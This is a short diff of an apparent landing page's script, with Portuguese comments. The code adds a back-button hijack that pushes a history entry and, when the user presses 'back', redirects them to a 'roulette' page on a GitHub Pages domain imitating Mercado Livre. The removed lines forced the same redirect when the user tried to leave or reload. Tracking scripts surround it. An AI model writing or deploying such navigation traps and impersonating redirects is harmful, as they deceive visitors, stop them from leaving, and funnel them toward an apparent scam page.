@@ -310,19 +310,13 @@
 <script src="js/latest.js" data-utmify-prevent-xcod-sck="" data-utmify-prevent-subids="" async="" defer=""></script>
 
 <script>
-  // Impede que o usuário use o botão "voltar"
+  // Impede o botão "voltar" e redireciona para outro link
   history.pushState(null, null, location.href);
-  window.onpopstate = function () {
+  window.addEventListener('popstate', function () {
     window.location.href = "https://mercadolivre3.github.io/roleta/";
-  };
+  });
+</script>
 
-  // Redireciona se tentar sair ou recarregar a página
-  window.addEventListener("beforeunload", function (e) {
-    // Redirecionamento
-    window.location.href = "https://mercadolivre3.github.io/roleta/";
-
-    // Mensagem padrão (pode não aparecer em navegadores modernos)
-    e
 
  <!-- Meta Pixel Code -->
 <script>
